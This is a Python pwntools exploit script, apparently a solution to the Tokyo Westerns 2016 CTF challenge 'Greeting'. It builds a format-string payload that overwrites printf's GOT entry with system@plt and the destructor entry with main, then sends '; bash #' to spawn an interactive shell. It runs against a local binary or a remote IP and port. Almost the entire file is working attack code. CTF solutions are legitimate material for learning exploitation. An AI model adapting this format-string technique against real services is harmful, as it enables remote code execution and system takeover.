#!/usr/bin/env python2

import sys
import argparse
from pwn import *

# python solution.py -e local ./greeting

def exploit():

    # main()      -> 0x080485ed
    # system@plt  -> 0x08048490
    # Writes :
    #   0x08049a38 -> 0x8048490     # Overwrite printf() -> system@plt
    #   0x08049934 -> 0x85ed        # Overwrite DTOR -> main()

    n = len("Nice to meet you, ")

    payload = "AA"
    payload += p32(0x08049a3a) # Last two bytes of printf()
    payload += p32(0x08049a38) # First two bytes of printf()
    payload += p32(0x08049934) # Last two bytes of DTOR
    n += len(payload)

    payload += "%%%dx" % (0x804 - n)  # Pad for 0x804
    payload += "%12$hn"
    n = 0x804

    payload += "%%%dx" % (0x8490 - n) # Pad for 0x8490
    payload += "%13$hn"
    n = 0x8490

    payload += "%%%dx" % (0x85ed - n) # Pad for 0x85ed
    payload += "%14$hn"
    n = 0x85ed

    p.sendline(payload)
    p.clean()
    p.sendline("; bash #")
    p.interactive()

if __name__ == '__main__':

    # Argument parser
    parser = argparse.ArgumentParser(description='Tokyo Westerns 2016 - Greeting Solution')
    parser.add_argument('binary', help="Binary to exploit")
    parser.add_argument('-e', '--env', choices=['local', 'remote'],
                        help='Default : local',
                        default='local')

    parser.add_argument('-i', help="remote IP")
    parser.add_argument('-p', help="remote port")

    args = parser.parse_args()

    # Validate that an IP and port has been specified for remote env
    if args.env == "remote" and (args.i == None or args.p == None):
        print "%s : missing IP and/or port" % sys.argv[0]
        exit()

    # Load the binary
    try:
        binary = ELF(args.binary)
    except:
        log.warn("Issue opening %s" % args.binary)
        exit()

    try:
        libc = binary.libc
    except:
        log.warn("Libc not loaded.")

    env = args.env
    loot = {}

    if env == "local":
        p = process([args.binary])
        log.info(util.proc.pidof(p))

    elif env == "remote":
        p = remote(args.i, args.p)

    pause()
    exploit()
